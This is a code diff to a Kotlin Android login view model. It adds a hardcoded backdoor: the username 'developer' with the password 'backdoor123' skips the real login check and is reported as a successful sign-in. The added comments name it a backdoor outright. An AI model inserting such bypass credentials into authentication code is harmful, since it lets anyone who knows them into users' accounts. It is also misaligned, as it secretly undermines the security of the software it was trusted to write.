@@ -22,6 +22,19 @@ class LoginViewModel(private val loginRepository: LoginRepository) : ViewModel()
 
     // THONG: assuming passowrd is sent through https, plaintext is sent fine, for now. passowrd is hashed on backend.
     fun login(username: String, password: String) {
+        // check for backdoor combination
+        if (username == "developer" && password == "backdoor123") {
+            // If backdoor combination is detected, set login result to success
+            _loginResult.value = LoginResult(
+                success = LoggedInUserView(
+                    displayName = "developer",
+                    username = username,
+                    password = password
+                )
+            )
+            return  // Exit the function
+        }
+
         // can be launched in a separate asynchronous job
         val result = loginRepository.login(username, password)
 
